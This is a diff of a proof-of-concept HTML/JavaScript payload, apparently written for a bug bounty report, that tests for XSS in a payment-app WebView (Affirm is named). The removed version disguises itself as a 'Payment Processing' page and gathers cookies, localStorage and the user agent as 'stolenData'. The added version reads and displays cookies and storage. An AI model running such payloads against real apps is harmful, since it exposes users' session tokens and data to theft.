@@ -1,36 +1,15 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Payment Processing...</title>
-    <!-- Mimic the styling of the real app to look legitimate -->
-    <style>body { font-family: sans-serif; text-align: center; padding: 20px; } .loader { ... } </style>
-</head>
-<body>
-    <h3>Finalizing your payment details...</h3>
-    <div id="status">Connecting to payment provider...</div>
+<script>
+    // 1. Prove we can run code (XSS)
+    document.body.style.backgroundColor = "red";
+    document.body.innerHTML = "<h1>Security Test</h1>";
 
-    <script>
-        // 1. PROVE XSS
-        alert("XSS Confirmed: JavaScript executing in Trusted Context");
+    // 2. Try to read APP data (The critical part)
+    // If the WebView shares storage with the rest of the app, this will not be empty.
+    var cookies = document.cookie;
+    var localStore = JSON.stringify(localStorage);
 
-        // 2. PROVE DATA THEFT CAPABILITY
-        // In a real attack, we would hook the 'affirm' object if it exists
-        // or just steal cookies/localStorage that might contain session tokens.
-        
-        var stolenData = {
-            cookies: document.cookie,
-            localStorage: JSON.stringify(localStorage),
-            userAgent: navigator.userAgent
-        };
-
-        // Log it to the screen (Proof for Triager)
-        document.getElementById("status").innerHTML = 
-            "<h2 style='color:red'>Data Exfiltrated:</h2><pre>" + 
-            JSON.stringify(stolenData, null, 2) + "</pre>";
-
-        // 3. SHOW BUSINESS IMPACT
-        // Explain that if this was the real Affirm flow, we would intercept:
-        // affirm.analytics.trackOrderConfirmed(...)
-    </script>
-</body>
-</html>
+    // 3. Display the data
+    document.body.innerHTML += 
+        "<h3>App Cookies:</h3><div>" + (cookies || "None found") + "</div>" +
+        "<h3>App Storage:</h3><div>" + (localStore || "None found") + "</div>";
+</script>
